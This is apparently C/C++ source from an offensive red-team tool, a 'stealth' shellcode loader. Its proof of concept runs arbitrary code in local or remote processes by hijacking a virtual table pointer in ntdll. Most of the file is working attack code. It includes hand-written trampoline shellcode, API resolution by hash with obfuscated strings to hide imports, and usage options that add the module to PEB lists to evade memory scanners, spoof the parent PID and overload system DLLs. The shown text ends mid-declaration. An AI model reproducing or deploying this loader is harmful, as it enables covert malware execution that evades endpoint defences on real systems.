/****
 * Proof of concept only. 
 * A novel way to trigger the execution of magic code via global virtual table pointer (VT Ptr).
 * 
 * Stealth NZ loader: 
 * A process injection would have primitives equivalent to: 
 * 1. VirtualAlloc (+ VirtualProtect/Ex)  --> allocate memory and or change permission
 * 2. WriteProcessMemory   --> write code
 * 3. CreateThread     --> Invoke code via a thread
 * Step 1 is replaced with mapping a legitimate system DLL of MEM_IMAGE type into remote process, system DLL's entrypoint is of RX by default.
 * Step 2 is replaced with a APC write method. 
 * Step 3 is replaced with a custom VT Ptr redirection method. The VT Ptr is of read and write permission by default and called
 * by many functions. The pretext code prepended to the magic code will do some housekeeping such as
 * restore the VT Ptr's original value, call magiccode, and preserve the original registers and stack after execution. 
 * Hence, a "threadless" new process injection is achieved. 
 * 
 * With option -ldr to add PEB to module list to evade memory scanners like Moneta
 * This loader 73 will not change the magiccode permission inside the pretext. The magiccode memory pages are of PAGE_NOACCESS (with -a pass)
 * after the point RtlUserThreadStart is called for LOCAL injection. After magiccode is called, the exeuction will 
 * return to the original function where BaseThreadInitThunk should be called. 
 *  
 * TODO: implement PEM module loading for remote process. 
 * Add indirect syscall with Halo's gate method to replace NT functions used. 
 * Author: Thomas X Meng
# Date 2023
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2025 Thomas M
# Licensed under the GPLv3 or later.
 * 
*/
#include <windows.h>
#include <winternl.h> 
#include <psapi.h>
#include <stdlib.h> 
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>

///For dynamic loading: 
#include <stdint.h>
#include "processthreadsapi.h"
#include "libloaderapi.h"
#include <winnt.h>
#include <lmcons.h>
/// PEB module loader:
#include "pebutils.h"
// #include "HardwareBreakpoints.h"






#define MAX_INPUT_SIZE 100

typedef BOOL (WINAPI *DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);
typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void *reserved);

/// DLL inj blocking and mitigation policies and ppid: 
typedef BOOL(WINAPI *InitializeProcThreadAttributeListFunc)(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD dwAttributeCount,
    DWORD dwFlags,
    PSIZE_T lpSize
);

typedef BOOL(WINAPI *UpdateProcThreadAttributeFunc)(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD dwFlags,
    DWORD_PTR Attribute,
    PVOID lpValue,
    SIZE_T cbSize,
    PVOID lpPreviousValue,
    PSIZE_T lpReturnSize
);


///// DLL inj blocking and policy mitigation.
BOOL block_dlls_local()
{

	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY Policy = { 0 };
	Policy.MicrosoftSignedOnly = 1;

	BOOL result = SetProcessMitigationPolicy(ProcessSignaturePolicy, &Policy, sizeof(Policy));
	
	if (!result)
	{
		printf("[-] Failed to set DLL block for current process (%u)\n", GetLastError());

        return 0;
	}
	
	return 1;
}

///// End of DLL inj blocking and policy mitigation.

//// VT hooking:
/// deifne a MACRO that has VMT Ptr offset to the module image base.
/// This value is being dynamicall retrieved now for BaseThreadInitThunk
uintptr_t VMT_PTR = 0x00; //ntdll.dll 
// #define VMT_PTR 0x183EF0 //ntdll.dll 
// #define VMT_PTR 0xFC1B8 // gudi32full.dll
// #define VMT_PTR 0xB6240 //user32.dll
BOOL bUseRtlCreateUserThread = FALSE, bUseCreateThreadpoolWait = FALSE; // Default to FALSE
BOOL bUseNoAccess = FALSE; 
HANDLE hProcess = NULL; 

SIZE_T magiccodeSize = 0; 
SIZE_T regionSize = 0; // The size of the region
SIZE_T totalSize = 0; // The total size of the region
PVOID dllEntryPoint = NULL;
PVOID opCodeAddress = NULL;

///The trampoline code for non-CFG complied method 
#define POINTER_OFFSET 6
#define RETURN_ADDRESS_OFFSET 19

BYTE trampCodeBuff[33] = {
    0x48, 0x83, 0xEC, 0x28,       // SUB RSP, 0x28  (adjust stack for shadow space)
    0x49, 0xBA,                   // MOV R10, imm64 (load the target address into R10)
    0x00, 0x00, 0x00, 0x00,       // Lower 32 bits of the address (filled in later)
    0x00, 0x00, 0x00, 0x00,       // Upper 32 bits of the address (filled in later)
    0x41, 0xFF, 0xD2,             // CALL R10 (call the function at the address in R10)

    // Push the return address onto the stack
    0x48, 0xB8,                   // MOV RAX, imm64 (load the return address into RAX)
    0x00, 0x00, 0x00, 0x00,       // Lower 32 bits of the return address (filled in later)
    0x00, 0x00, 0x00, 0x00,       // Upper 32 bits of the return address (filled in later)
    0x50,                         // PUSH RAX (push the return address onto the stack)

    0xC3,                         // RET (return to the address we just pushed onto the stack)

    0x48, 0x83, 0xC4, 0x28,       // ADD RSP, 0x28 (restore the stack space)
};


// find VT PTR
typedef ULONG (NTAPI *RtlUserThreadStart_t)(PTHREAD_START_ROUTINE BaseAddress, PVOID Context);
RtlUserThreadStart_t pRtlUserThreadStart = NULL;

// Detect Windows version
int detectWindowsVersionFromPEB() {
    // Get the PEB pointer
    PPEB2 pPEB = NULL;

#ifdef _WIN64
    pPEB = (PPEB2)__readgsqword(0x60); // Read PEB address from GS segment
#else
    pPEB = (PPEB2)__readfsdword(0x30); // Read PEB address from FS segment
#endif

    if (!pPEB) {
        printf("[-] Failed to retrieve PEB.\n");
        return 0x1337;
    }

    // Retrieve the OS version fields
    ULONG majorVersion = pPEB->OSMajorVersion;
    ULONG minorVersion = pPEB->OSMinorVersion;
    USHORT buildNumber = pPEB->OSBuildNumber;

    printf("[+] OS Version: Major %lu, Minor %lu, Build %u\n", majorVersion, minorVersion, buildNumber);

    // Determine the OS type
    if (majorVersion == 10 && minorVersion == 0) {
        if (buildNumber >= 22000) {
            printf("[+] Detected Windows 11\n");
            return 1;
        } else {
            printf("[+] Detected Windows 10\n");
            return 0;
        }
    } else if (majorVersion == 6) {
        printf("[+] Detected Windows Server or older versions (6.x)\n");
        return 0;
    } else {
        printf("[+] Unknown or unsupported Windows version\n");
        return 0x1337;
    }
}


PVOID getPattern(unsigned char* pattern, SIZE_T pattern_size, SIZE_T offset, PVOID base_addr, SIZE_T module_size)
{
	PVOID addr = base_addr;
	while (addr != (char*)base_addr + module_size - pattern_size)
	{
		if (memcmp(addr, pattern, pattern_size) == 0)
		{
			printf("[+] Found pattern @ 0x%p\n", addr);
			return (char*)addr - offset;
		}
		addr = (char*)addr + 1;
	}

	return NULL;
}
// find VT PTR


#define ADDR unsigned __int64


///Various methods to GetNtdllBase:
ADDR *GetNtdllBase (void);

// Define basethreadinitthunk in Kernel32.dll:
typedef ULONG (WINAPI *BaseThreadInitThunk_t)(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);
BaseThreadInitThunk_t pBaseThreadInitThunk = NULL;

DWORD_PTR originalVtPtrValue = 0; 
BYTE *pHookAddr = NULL;
HANDLE newThread = NULL; 

// find VT PTR
BYTE *findVTPointer(BYTE *pModuleBase) {

    // Find the vulnerable VT pointer
    pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress((HMODULE)pModuleBase, "RtlUserThreadStart");

    if (!pRtlUserThreadStart) {
        printf("[-] Failed to locate RtlUserThreadStart.\n");
        return FALSE;
    } else {
        printf("[+] Located RtlUserThreadStart @ %p \n", pRtlUserThreadStart);
    }


    // TODO: make a test for Windows 10 and Windows 11 machine: 
    unsigned char mov_r8_rdx_pattern[3]; 
    int winVersion = detectWindowsVersionFromPEB();
    if(winVersion == 1) {
        printf("[+] Windows 11 detected, use mov r8, edx\n");
        // Define the pattern for the instruction `mov r8, rdx` (machine code for `4C 89 C2`)
        mov_r8_rdx_pattern[0] = 0x4C;
        mov_r8_rdx_pattern[1] = 0x8B;
        mov_r8_rdx_pattern[2] = 0xC2;
        // mov_r8_rdx_pattern[] = {0x4C, 0x8B, 0xC2}; //Windows 11 
    } else {
        printf("[+] Windows 10 detected, use mov r9, rcx\n");
        mov_r8_rdx_pattern[0] = 0x4C;
        mov_r8_rdx_pattern[1] = 0x8B;
        mov_r8_rdx_pattern[2] = 0xC9;
        // mov_r8_rdx_pattern[] = {0x4C, 0x8B, 0xC9}; //Windows 10 and Windows Server 2022
    }

    SIZE_T pattern_size = sizeof(mov_r8_rdx_pattern);

    SIZE_T moduleSize;
    PVOID targetAddress;

    // Search for the pattern in memory
    targetAddress = getPattern(mov_r8_rdx_pattern, pattern_size, 0, (PVOID)pRtlUserThreadStart, 0xffff);
    targetAddress = (PVOID)((unsigned char*)targetAddress + 6);  

    DWORD relativeValue;
    relativeValue = *(DWORD*)targetAddress;


    if (targetAddress == NULL) {
        printf("[-] Failed to find the target instruction pattern.\n");
        return (BYTE *)1;
    } else {
        printf("[+] Relative address is: %p\n", relativeValue);
        VMT_PTR = (uintptr_t)relativeValue;
    }

    targetAddress = (PVOID)((unsigned char*)targetAddress + 0x4);  
    PVOID virtualPointer = (PVOID)((uintptr_t)relativeValue + (uintptr_t)targetAddress);
    printf("[+] VT pointer is: %p \n", virtualPointer);

    // // Retrieve the pointer value referenced by the instruction
    PVOID pointerValue = *(PVOID *)virtualPointer;
    printf("[+] pointer value is: %p\n", pointerValue);
    /// End of finding the VT pointer
    return (BYTE *)virtualPointer;

}

// find VT PTR

// Function type of hooked_fuction, it can be the same of original function being called. 
// DWORD_PTR hooked_function();
ULONG WINAPI hooked_function(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);

// global pointers being used in different functions 
PVOID fileBaseGlobal = NULL;
DLLEntry DllEntryGlobal = NULL;


//////// end of VMT hooking. 



// Standalone function to delay execution using WaitForSingleObjectEx
// It is optional, and not used. 
void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); 
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE);
        CloseHandle(hEvent); 
    }
}

/// DLL functions: 
const wchar_t* GetDllNameFromPath(const wchar_t* dllPath) {
    const wchar_t* dllName = wcsrchr(dllPath, L'\\');
    if (dllName) {
        return dllName + 1; // Move past the backslash
    }
    return dllPath; // If no backslash found, the path is already the DLL name
}


typedef struct _LDR_DATA_TABLE_ENTRY_FREE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    _ACTIVATION_CONTEXT *EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY_FREE, *PLDR_DATA_TABLE_ENTRY_FREE;




////////////////////////// Breakpoint test end

void ManualInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    DestinationString->Length = wcslen(SourceString) * sizeof(WCHAR);
    DestinationString->MaximumLength = DestinationString->Length + sizeof(WCHAR);
    DestinationString->Buffer = (PWSTR)SourceString;
}


typedef NTSTATUS (NTAPI *pNtCreateThreadStateChange)(
    PHANDLE ThreadStateChangeHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ThreadHandle,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtChangeThreadState)(
    HANDLE ThreadStateChangeHandle,
    HANDLE ThreadHandle,
    ULONG Action,
    PVOID ExtendedInformation,
    SIZE_T ExtendedInformationLength,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtCreateProcessStateChange)(
    PHANDLE StateChangeHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtChangeProcessState)(
    HANDLE StateChangeHandle,
    HANDLE ProcessHandle,
    ULONG Action,
    PVOID ExtendedInformation,
    SIZE_T ExtendedInformationLength,
    ULONG64 Reserved
);




////// Test alert: 
// not used in this PoC
#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

// not used in this PoC

/////////////////////////////////// Dynamic loading: 

uint32_t crc32c(const char *s) {
    int      i;
    uint32_t crc=0;
    
    while (*s) {
        crc ^= (uint8_t)(*s++ | 0x20);
        
        for (i=0; i<8; i++) {
            crc = (crc >> 1) ^ (0x82F63B78 * (crc & 1));
        }
    }
    return crc;
}

// Utility function to convert an UNICODE_STRING to a char*
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;

	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (NULL == *ppszA)
		return E_OUTOFMEMORY;

	if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL))
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}


/*https://blog.christophetd.fr/hiding-windows-api-imports-with-a-customer-loader/*/
namespace dynamic {
    // Dynamically finds the base address of a DLL in memory
    ADDR find_dll_base(const char* dll_name) {
        // Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
        //  and GetModuleHandle which defeats the very purpose of this PoC
        // Well, this is a chicken and egg problem, we have to call those 2 functions stealthly. 
        PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
        PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

        PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        // Iterate through every loaded DLL in the current process
        do {
            PLDR_DATA_TABLE_ENTRY_FREE dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
            char* dllName;
            // Convert unicode buffer into char buffer for the time of the comparison, then free it
            UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
            char* result = strstr(dllName, dll_name);
            CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi

            if (result != NULL) {
                // Found the DLL entry in the PEB, return its base address
                return (ADDR)dllEntry->DllBase;
            }
            curr = curr->Flink;
        } while (curr != head);

        return 0;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function
    ADDR find_dll_export(ADDR dll_base, const char* export_name) {
        // Read the DLL PE header and NT header
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);

        // The RVA of the export table if indicated in the PE optional header
        // Read it, and read the export table by adding the RVA to the DLL base address in memory
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        // Browse every export of the DLL. For the i-th export:
        // - The i-th element of the name table contains the export name
        // - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (int i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
            if (!_strcmpi(funcName, export_name)) {
                return func_ptr;
            }
        }

        return 0;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function by hash
    ADDR find_dll_export_by_hash(ADDR dll_base, uint32_t target_hash) {
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (DWORD i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            uint32_t hash = crc32c(funcName);
            if (hash == target_hash) {
                ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
                return func_ptr;
            }
        }

        return 0; // Function not found
    }


    using LoadLibraryPrototype = HMODULE(WINAPI*)(LPCWSTR);
    LoadLibraryPrototype loadFuture;
    using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
    GetModuleHandlePrototype GetModuleHandle;
    using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    GetProcAddressPrototype NotGetProcAddress;

    void resolve_imports(void) {

        const char essentialLib[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
        const char EssentialLib[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 };
        const char CrucialLib[] = { 'N', 'T', 'D', 'L', 'L', 0 };
        const char crucialLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
        const char GetFutureStr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
        const char LoadFutureStr[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
        const char GetModuleHandleStr[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0 };
        ADDR kernel32_base = find_dll_base(EssentialLib);
        ADDR ntdll_base = find_dll_base(CrucialLib);
        // Example hashes for important functions
        uint32_t hash_GetProcAddress = crc32c(GetFutureStr);
        uint32_t hash_LoadLibraryW = crc32c(LoadFutureStr);
        uint32_t hash_GetModuleHandleA = crc32c(GetModuleHandleStr);
        const char NtCreateThreadStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
        uint32_t hash_NtCreateThread = crc32c(NtCreateThreadStr);
        // printf("[+] Hash of NtCreateThread: %x\n", hash_NtCreateThread);
        // // printf the hash to user:
        // printf("[+] Hash of GetProcAddress: %x\n", hash_GetProcAddress);
        // printf("[+] Hash of LoadLibraryW: %x\n", hash_LoadLibraryW);

        // Resolve functions by hash
        dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(kernel32_base, hash_GetProcAddress);
        dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(kernel32_base, hash_GetModuleHandleA);
        #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(essentialLib), _name))
        // dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(ntdll_base, hash_GetProcAddress);
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(ntdll_base, hash_GetModuleHandleA);
        // #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(crucialLib), _name))
        #define _import_crucial(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(crucialLib), _name))
        // #define _import_crucial(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleessentialLibHandle(crucialLib), _name))

        dynamic::loadFuture = (LoadLibraryPrototype) _import(LoadFutureStr, LoadLibraryPrototype);    
        // Verify the resolution
        if (dynamic::NotGetProcAddress != NULL && dynamic::loadFuture != NULL && dynamic::GetModuleHandle != NULL) {
            printf("[+] APIs resolved by hash successfully.\n");
        } else {
            printf("[-] Error resolving APIs by hash.\n");
        }

        printf("[+] LoadLibrary at: %p\n by stealth module loading", loadFuture);
    }
}

/* Resolve protection number to string value*/
const char* ProtectionToString(DWORD protection) {
    switch (protection) {
        case PAGE_NOACCESS: return "PAGE_NOACCESS";
        case PAGE_READONLY: return "PAGE_READONLY";
        case PAGE_READWRITE: return "PAGE_READWRITE";
        case PAGE_WRITECOPY: return "PAGE_WRITECOPY";
        case PAGE_EXECUTE: return "PAGE_EXECUTE";
        case PAGE_EXECUTE_READ: return "PAGE_EXECUTE_READ";
        case PAGE_EXECUTE_READWRITE: return "PAGE_EXECUTE_READWRITE";
        case PAGE_EXECUTE_WRITECOPY: return "PAGE_EXECUTE_WRITECOPY";
        case PAGE_GUARD: return "PAGE_GUARD";
        case PAGE_NOCACHE: return "PAGE_NOCACHE";
        case PAGE_WRITECOMBINE: return "PAGE_WRITECOMBINE";
        default: return "UNKNOWN";
    }
}


// Necessary for certain definitions like ACCESS_MASK
#ifndef WIN32_NO_STATUS
#define WIN32_NO_STATUS
#undef WIN32_NO_STATUS
#else
#include <ntstatus.h>
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder);
BOOL PrintSectionDetails(const wchar_t* dllPath);

void PrintUsageAndExit() {
    wprintf(L"Usage: loader_21.exe [-txf] [-dll <order>] [-h]\n");
    wprintf(L"Options:\n");
    wprintf(L"  -txf                Use Transactional NTFS (TxF) for DLL loading.\n");
    wprintf(L"  -dll <order>        Specify the order of the suitable DLL to use (default is 1). Not all DLLs are suitable for overloading\n");
    wprintf(L"  -h                  Print this help message and exit.\n");
    wprintf(L"  -thread             Use an alternative NT call other than the NtCreateThread.\n");
    wprintf(L"  -pool               Use Threadpool for APC Write.\n");
    wprintf(L"  -ldr                use LdrLoadDll instead of NtCreateSection->NtMapViewOfSection for DLL loading.\n");
    wprintf(L"  -peb                Use custom function to add loaded module to PEB lists to evade memory scanners (e.g. Moneta).\n");
    wprintf(L"  -remote             Use remote process injection. You will be asked to insert the PID number of the target process. \n");
    wprintf(L"  -dotnet             Use .NET assemblies instead of regular DLLs\n");
    wprintf(L"  -ppid               provide the target parent PID to spoof. \n");
    wprintf(L"  -a                  Switch to PAGE_NOACCESS after write the memory to .text section\n");
    ExitProcess(0);
}


BOOL ValidateDLLCharacteristics(const wchar_t* dllPath, uint32_t requiredSize, bool dotnet = FALSE) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE; // Cannot open file
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = new BYTE[fileSize]; // Allocate buffer for the whole file
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Failed to read file
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }


    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }

    if(dotnet) {
        // Verify it's a .NET assembly by checking the CLR header
        IMAGE_DATA_DIRECTORY* clrDataDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
        if (clrDataDirectory->VirtualAddress == 0 || clrDataDirectory->Size == 0) {
            // Not a .NET assembly
            CloseHandle(hFile);
            delete[] buffer;
            return FALSE;
        }
    }
    // Check if SizeOfImage is sufficient
    if (ntHeaders->OptionalHeader.SizeOfImage < requiredSize) {
        CloseHandle(hFile);
        return FALSE; // Image size is not sufficient
    }

    printf("[+] SizeOfImage: %lu\n", ntHeaders->OptionalHeader.SizeOfImage);

    BOOL textSectionFound = FALSE;
    IMAGE_SECTION_HEADER* sectionHeaders = NULL;
    if(!dotnet) {
        // Validate the .text section specifically
        sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));
        // BOOL textSectionFound = FALSE;
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
            if (strncmp((char*)section->Name, ".text", 5) == 0) {
                textSectionFound = TRUE;
                if (section->Misc.VirtualSize < requiredSize) {
                    CloseHandle(hFile);
                    delete[] buffer;
                    return FALSE; // .text section size is not sufficient
                }
                break;
            }
        }
    } else {
        textSectionFound = TRUE;
    }

    if(!dotnet) {
        printf("[+] .text section found: %s\n", textSectionFound ? "Yes" : "No");
        //print the size of the .text section in human readable format:
        printf("[+] .text section size: %lu bytes\n", sectionHeaders->Misc.VirtualSize);
    }

    if (!textSectionFound) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // .text section not found
    }

    CloseHandle(hFile);
    delete[] buffer;
    return TRUE; // DLL is suitable
}


BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder, bool dotnet = FALSE) {
    WIN32_FIND_DATAW findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t systemDir[MAX_PATH] = { 0 };
    wchar_t searchPath[MAX_PATH] = { 0 };
    int foundCount = 0; // Count of suitable DLLs found

    // Get the system directory path
    if (!GetSystemDirectoryW(systemDir, _countof(systemDir))) {
        wprintf(L"Failed to get system directory. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Construct the search path for DLLs in the system directory
    swprintf_s(searchPath, _countof(searchPath), L"%s\\*.dll", systemDir);

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to find first file. Error: %lu\n", GetLastError());
        return FALSE;
    }


    if(dotnet) {
        printf("\n [+] Looking for .NET assemblies\n");
    } else {
        printf("\n [+] Looking for suitable candidate DLLs\n");
    }
    do {
        // Skip directories
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, _countof(fullPath), L"%s\\%s", systemDir, findData.cFileName);

        if (GetModuleHandleW(findData.cFileName) == NULL && ValidateDLLCharacteristics(fullPath, requiredSize, dotnet)) {
            foundCount++; // Increment the suitable DLL count
            if (foundCount == dllOrder) { // If the count matches the specified order
                // For simplicity, we're not using bTxF here, but you could adjust your logic
                // to use it for filtering or preparing DLLs for TxF based operations.
                // swprintf_s(fullPath, MAX_PATH, L"%s\\%s", systemDir, findData.cFileName);
                wcsncpy_s(dllPath, bufferSize, fullPath, _TRUNCATE);
                FindClose(hFind);
                // TODO:enable the function below if you want to see the statistics of the dll you are going to use:
                // PrintSectionDetails(fullPath);
                return TRUE; // Found the DLL in the specified order
            }
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
    return FALSE;
}



// Prototype for LdrLoadDll, which is not documented in Windows SDK headers.
typedef NTSTATUS (NTAPI *LdrLoadDll_t)(
    IN PWCHAR               PathToFile OPTIONAL,
    IN ULONG                Flags OPTIONAL,
    IN PUNICODE_STRING      ModuleFileName,
    OUT PHANDLE             ModuleHandle);

//////////////////////////////////// TxF: 
typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PCLIENT_ID ClientID);

// deinfe pRtlExitUserThread:
typedef NTSTATUS (NTAPI *pRtlExitUserThread)(
    NTSTATUS ExitStatus
);

//define NtOpenProcess:
typedef NTSTATUS (NTAPI *NtOpenProcess_t)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);


// Define the NT API function pointers
typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
// typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
//define NtUnMapViewOfSection:
